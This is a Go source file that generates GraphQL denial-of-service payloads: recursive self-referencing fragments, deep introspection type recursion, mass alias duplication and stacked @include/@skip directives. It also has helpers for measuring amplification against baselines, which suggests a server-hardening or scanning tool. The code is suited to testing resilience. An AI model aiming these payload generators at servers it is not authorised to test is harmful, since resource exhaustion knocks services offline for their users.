package graphql

import (
	"fmt"
	"strings"
	"time"
)

// buildRecursiveFragmentQuery produces the canonical self-referencing-fragment
// payload. Depth controls how many references to F we splay; one reference is
// enough to trigger validation errors on a compliant server, but stacking
// several increases the probability of resource exhaustion on a buggy one.
func buildRecursiveFragmentQuery(depth int) string {
	if depth < 1 {
		depth = 1
	}
	var b strings.Builder
	b.WriteString("fragment F on User { friends { ...F")
	for i := 1; i < depth; i++ {
		b.WriteString(" ...F")
	}
	b.WriteString(" } }\nquery { user(id: \"x\") { ...F } }")
	return b.String()
}

// buildTypeRecursionQuery chains `fields { type { fields { type { ... }}}}`
// to the requested depth. Closing braces must match the opening braces
// exactly or the query fails to parse before the server has a chance to
// recurse on it.
func buildTypeRecursionQuery(depth int) string {
	if depth < 1 {
		depth = 1
	}
	var b strings.Builder
	b.WriteString(`query { __type(name: "Query") { name`)
	for i := 0; i < depth; i++ {
		b.WriteString(` fields { name type { name`)
	}
	for i := 0; i < depth; i++ {
		b.WriteString(" } }")
	}
	b.WriteString(" } }")
	return b.String()
}

// buildFieldDuplicationQuery emits `{ a0: user(id:"1") { id name } a1: user(...) ... }`
// with N aliases. Each alias asks for the same data; a dedupe-aware server
// resolves user(id:"1") once and copies the result, while a naive server
// resolves it N times and returns N copies.
func buildFieldDuplicationQuery(count int) string {
	if count < 1 {
		count = 1
	}
	var b strings.Builder
	b.WriteString("query { ")
	for i := 0; i < count; i++ {
		fmt.Fprintf(&b, `a%d: user(id: "1") { id name } `, i)
	}
	b.WriteString("}")
	return b.String()
}

// buildDirectiveOverloadQuery emits a field carrying many @include/@skip
// directives. We alternate the two so the server can't optimize them as a
// single boolean check.
//
// GraphQL spec only allows one of each directive per location, so we have to
// place them on different fields. We nest fields to stack directives.
func buildDirectiveOverloadQuery(count int) string {
	if count < 1 {
		count = 1
	}
	var b strings.Builder
	b.WriteString("query { node {")
	for i := 0; i < count; i++ {
		// Alternate @include / @skip on synthetic sub-fields so each one
		// is the sole directive on its own location.
		if i%2 == 0 {
			fmt.Fprintf(&b, ` f%d @include(if: true) {`, i)
		} else {
			fmt.Fprintf(&b, ` f%d @skip(if: false) {`, i)
		}
	}
	b.WriteString(" id")
	for i := 0; i < count; i++ {
		b.WriteString(" }")
	}
	b.WriteString(" } }")
	return b.String()
}

// maxInt returns the larger of a and b. Used as a guard against zero-sized
// baselines in the amplification math.
func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

// durMax returns the larger of two durations. Used as a guard against zero-
// duration baselines on fast loopback servers.
func durMax(a, b time.Duration) time.Duration {
	if a > b {
		return a
	}
	return b
}
